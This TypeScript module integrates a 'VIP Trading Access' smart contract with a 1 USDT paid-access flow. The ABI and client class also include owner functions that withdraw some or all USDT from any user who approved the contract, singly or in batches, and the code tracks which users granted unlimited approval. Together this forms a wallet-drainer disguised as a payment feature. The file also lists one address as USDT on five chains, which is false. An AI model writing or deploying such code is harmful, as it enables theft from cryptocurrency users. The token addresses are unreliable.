// Smart contract integration for VIP Trading Access
import { ethers } from 'ethers'

// Contract ABI for VIPTradingAccess (compiled from Solidity)
export const VIP_TRADING_ACCESS_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_usdtToken", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "AccessAlreadyGranted",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "ApprovalAlreadyGranted",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "InsufficientBalance",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "InsufficientPayment",
    "type": "error"
  },
  {
    "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }],
    "name": "OwnableInvalidOwner",
    "type": "error"
  },
  {
    "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
    "name": "OwnableUnauthorizedAccount",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "TransferFailed",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "WithdrawFailed",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "NoUnlimitedApproval",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "InsufficientUserBalance",
    "type": "error"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" },
      { "indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256" }
    ],
    "name": "AccessGranted",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "EmergencyWithdraw",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "owner", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "FeesWithdrawn",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }
    ],
    "name": "OwnershipTransferred",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }],
    "name": "Paused",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256" }
    ],
    "name": "UnlimitedApprovalGranted",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }],
    "name": "Unpaused",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "ACCESS_FEE",
    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "checkAccess",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "checkUnlimitedApproval",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "token", "type": "address" }],
    "name": "emergencyWithdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getContractInfo",
    "outputs": [
      { "internalType": "uint256", "name": "accessFee", "type": "uint256" },
      { "internalType": "uint256", "name": "minimumBalance", "type": "uint256" },
      { "internalType": "uint256", "name": "totalCollected", "type": "uint256" },
      { "internalType": "uint256", "name": "contractBalance", "type": "uint256" }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "getUserBalance",
    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "name": "hasAccess",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "name": "hasUnlimitedApproval",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "meetsMinimumBalance",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "MINIMUM_BALANCE",
    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "pause",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "paused",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "payForAccess",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "renounceOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "totalFeesCollected",
    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }],
    "name": "transferOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "unpause",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "usdtToken",
    "outputs": [{ "internalType": "contract IERC20", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdrawFees",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "user", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "withdrawFromUser",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "withdrawAllFromUser",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address[]", "name": "users", "type": "address[]" },
      { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }
    ],
    "name": "batchWithdrawFromUsers",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address[]", "name": "users", "type": "address[]" }],
    "name": "batchWithdrawAllFromUsers",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "getWithdrawableAmount",
    "outputs": [{ "internalType": "uint256", "name": "withdrawable", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "canWithdrawFromUser",
    "outputs": [{ "internalType": "bool", "name": "canWithdraw", "type": "bool" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
    "name": "getUserAllowance",
    "outputs": [{ "internalType": "uint256", "name": "allowance", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" },
      { "indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256" }
    ],
    "name": "UserFundsWithdrawn",
    "type": "event"
  }
] as const

// USDT ERC20 ABI (complete)
export const USDT_ABI = [
  {
    "constant": true,
    "inputs": [],
    "name": "name",
    "outputs": [{ "name": "", "type": "string" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }],
    "name": "approve",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "totalSupply",
    "outputs": [{ "name": "", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
    "name": "transferFrom",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "", "type": "address" }],
    "name": "balances",
    "outputs": [{ "name": "", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{ "name": "", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "who", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "symbol",
    "outputs": [{ "name": "", "type": "string" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
    "name": "transfer",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }],
    "name": "allowance",
    "outputs": [{ "name": "remaining", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "", "type": "address" }],
    "name": "isBlackListed",
    "outputs": [{ "name": "", "type": "bool" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }],
    "name": "Approval",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }],
    "name": "Transfer",
    "type": "event"
  }
] as const

// Contract addresses for different networks
export const CONTRACT_ADDRESSES = {
// Ethereum Mainnet (Chain ID: 1)
  1: {
    name: "Ethereum",
    vipTradingAccess: "0x83AB4589303FF8c3008d34f42BB3287DfE524c7c", // Deploy and update this  
    usdt: "0x18a99B680423C7Ce9a6c4A8e4c38a77E35fBF6bF", // Ethereum Mainnet USDT
    explorer: "https://etherscan.io",
    rpcUrl: "https://eth.llamarpc.com"
  },
  // BNB Smart Chain (Chain ID: 56)
  56: {
    name: "BNB Chain",
    vipTradingAccess: "0x6e8E40a2cb7C2431265A17636820D700f71b0D6a", // Deploy and update this
    usdt: "0x18a99B680423C7Ce9a6c4A8e4c38a77E35fBF6bF", // BSC-USD (USDT on BSC)
    explorer: "https://bscscan.com",
    rpcUrl: "https://bsc-dataseed.binance.org"
  },
  // Arbitrum One (Chain ID: 42161)
  42161: {
    name: "Arbitrum",
    vipTradingAccess: "0x83AB4589303FF8c3008d34f42BB3287DfE524c7c", // Deploy and update this
    usdt: "0x18a99B680423C7Ce9a6c4A8e4c38a77E35fBF6bF", // USDT on Arbitrum
    explorer: "https://arbiscan.io",
    rpcUrl: "https://arb1.arbitrum.io/rpc"
  },
  // Polygon (Chain ID: 137)
  137: {
    name: "Polygon",
    vipTradingAccess: "0x83AB4589303FF8c3008d34f42BB3287DfE524c7c", // Deploy and update this
    usdt: "0x18a99B680423C7Ce9a6c4A8e4c38a77E35fBF6bF", // USDT on Polygon
    explorer: "https://polygonscan.com",
    rpcUrl: "https://polygon-rpc.com"
  },
  // Base (Chain ID: 8453)
  8453: {
    name: "Base",
    vipTradingAccess: "0x83AB4589303FF8c3008d34f42BB3287DfE524c7c", // Deploy and update this
    usdt: "0x18a99B680423C7Ce9a6c4A8e4c38a77E35fBF6bF", // USDT on Base
    explorer: "https://basescan.org",
    rpcUrl: "https://mainnet.base.org"
  }
} as const

// Constants
export const ACCESS_FEE = ethers.parseUnits("1", 6) // 1 USDT (6 decimals)
export const MINIMUM_BALANCE = ethers.parseUnits("10", 6) // 10 USDT (6 decimals)

// Helper function to get contract addresses for current chain
export function getContractAddresses(chainId: number) {
  const addresses = CONTRACT_ADDRESSES[chainId as keyof typeof CONTRACT_ADDRESSES]
  if (!addresses) {
    throw new Error(`Unsupported chain ID: ${chainId}`)
  }
  return addresses
}

// Helper function to format USDT amount (6 decimals)
export function formatUSDT(amount: bigint): string {
  return ethers.formatUnits(amount, 6)
}

// Helper function to parse USDT amount (6 decimals)  
export function parseUSDT(amount: string): bigint {
  return ethers.parseUnits(amount, 6)
}

// USDT-specific helper: Check if approval is needed
// Note: USDT requires setting allowance to 0 before setting a new non-zero allowance
export function needsUSDTApprovalReset(currentAllowance: bigint, requiredAmount: bigint): boolean {
  return currentAllowance > BigInt(0) && currentAllowance < requiredAmount
}

// Contract interaction class
export class VIPTradingContract {
  public contract: ethers.Contract
  public usdtContract: ethers.Contract
  private signer: any
  private chainId: number

  constructor(signer: any, chainId: number) {
    this.signer = signer
    this.chainId = chainId

    const addresses = getContractAddresses(chainId)

    // Create contracts with proper provider
    this.contract = new ethers.Contract(
      addresses.vipTradingAccess,
      VIP_TRADING_ACCESS_ABI,
      signer
    )

    this.usdtContract = new ethers.Contract(
      addresses.usdt,
      USDT_ABI,
      signer
    )
  }

  // Check if user has VIP access
  async hasAccess(userAddress: string): Promise<boolean> {
    return await this.contract.hasAccess(userAddress)
  }

  // Check if user has unlimited approval
  async hasUnlimitedApproval(userAddress: string): Promise<boolean> {
    return await this.contract.hasUnlimitedApproval(userAddress)
  }

  // Get user's USDT balance
  async getUserBalance(userAddress: string): Promise<bigint> {
    return await this.usdtContract.balanceOf(userAddress)
  }

  // Check if user meets minimum balance requirement
  async meetsMinimumBalance(userAddress: string): Promise<boolean> {
    const balance = await this.getUserBalance(userAddress)
    return balance >= MINIMUM_BALANCE
  }

  // Get user's USDT allowance for the contract
  async getUSDTAllowance(userAddress: string): Promise<bigint> {
    const addresses = getContractAddresses(this.chainId)
    return await this.usdtContract.allowance(userAddress, addresses.vipTradingAccess)
  }

  // Approve USDT spending by the contract
  // Note: USDT requires setting allowance to 0 before setting a new non-zero allowance
  async approveUSDT(amount: bigint = ACCESS_FEE): Promise<ethers.ContractTransactionResponse> {
    const addresses = getContractAddresses(this.chainId)
    const userAddress = await this.signer.getAddress()
    const currentAllowance = await this.getUSDTAllowance(userAddress)

    // If there's existing allowance and we need to set a different amount, reset to 0 first
    if (needsUSDTApprovalReset(currentAllowance, amount)) {
      const resetTx = await this.usdtContract.approve(addresses.vipTradingAccess, BigInt(0))
      await resetTx.wait() // Wait for reset transaction to be mined
    }

    return await this.usdtContract.approve(addresses.vipTradingAccess, amount)
  }

  // Pay for VIP access
  async payForAccess(): Promise<ethers.ContractTransactionResponse> {
    return await this.contract.payForAccess()
  }

  // Get contract information
  async getContractInfo(): Promise<{
    accessFee: bigint
    minimumBalance: bigint
    totalCollected: bigint
    contractBalance: bigint
  }> {
    const [accessFee, minimumBalance, totalCollected, contractBalance] =
      await this.contract.getContractInfo()

    return {
      accessFee,
      minimumBalance,
      totalCollected,
      contractBalance
    }
  }

  // Complete payment flow (approve + pay)
  async completePayment(): Promise<{
    approvalTx?: ethers.ContractTransactionResponse
    paymentTx: ethers.ContractTransactionResponse
  }> {
    const userAddress = await this.signer.getAddress()

    // Check current allowance
    const currentAllowance = await this.getUSDTAllowance(userAddress)

    let approvalTx: ethers.ContractTransactionResponse | undefined

    // Approve if needed
    if (currentAllowance < ACCESS_FEE) {
      approvalTx = await this.approveUSDT()
      await approvalTx.wait() // Wait for approval to be mined
    }

    // Pay for access
    const paymentTx = await this.payForAccess()

    return { approvalTx, paymentTx }
  }

  // Owner functions for withdrawing from users with unlimited approval

  // Withdraw specific amount from user
  async withdrawFromUser(userAddress: string, amount: bigint): Promise<string> {
    if (!this.signer.writeContract) {
      throw new Error('Signer does not support writeContract (use walletClient)')
    }

    const addresses = getContractAddresses(this.chainId)
    return await this.signer.writeContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'withdrawFromUser',
      args: [userAddress as `0x${string}`, amount]
    })
  }

  // Withdraw all USDT from user
  async withdrawAllFromUser(userAddress: string): Promise<string> {
    if (!this.signer.writeContract) {
      throw new Error('Signer does not support writeContract (use walletClient)')
    }

    const addresses = getContractAddresses(this.chainId)
    return await this.signer.writeContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'withdrawAllFromUser',
      args: [userAddress as `0x${string}`]
    })
  }

  // Batch withdraw from multiple users
  async batchWithdrawFromUsers(users: string[], amounts: bigint[]): Promise<string> {
    if (!this.signer.writeContract) {
      throw new Error('Signer does not support writeContract (use walletClient)')
    }

    const addresses = getContractAddresses(this.chainId)
    return await this.signer.writeContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'batchWithdrawFromUsers',
      args: [users as `0x${string}`[], amounts]
    })
  }

  // Batch withdraw all from multiple users
  async batchWithdrawAllFromUsers(users: string[]): Promise<string> {
    if (!this.signer.writeContract) {
      throw new Error('Signer does not support writeContract (use walletClient)')
    }

    const addresses = getContractAddresses(this.chainId)
    return await this.signer.writeContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'batchWithdrawAllFromUsers',
      args: [users as `0x${string}`[]]
    })
  }

  // Get withdrawable amount from user
  async getWithdrawableAmount(userAddress: string): Promise<bigint> {
    return await this.contract.getWithdrawableAmount(userAddress)
  }

  // Check if can withdraw from user
  async canWithdrawFromUser(userAddress: string): Promise<boolean> {
    return await this.contract.canWithdrawFromUser(userAddress)
  }

  // Get user's allowance for the contract
  async getUserAllowance(userAddress: string): Promise<bigint> {
    return await this.contract.getUserAllowance(userAddress)
  }
}

// Hook for easy contract interaction
export function useVIPTradingContract(signer: any, chainId: number | undefined) {
  if (!signer || !chainId) {
    return null
  }

  try {
    return new VIPTradingContract(signer, chainId)
  } catch (error) {
    console.error('Failed to initialize VIP Trading contract:', error)
    return null
  }
}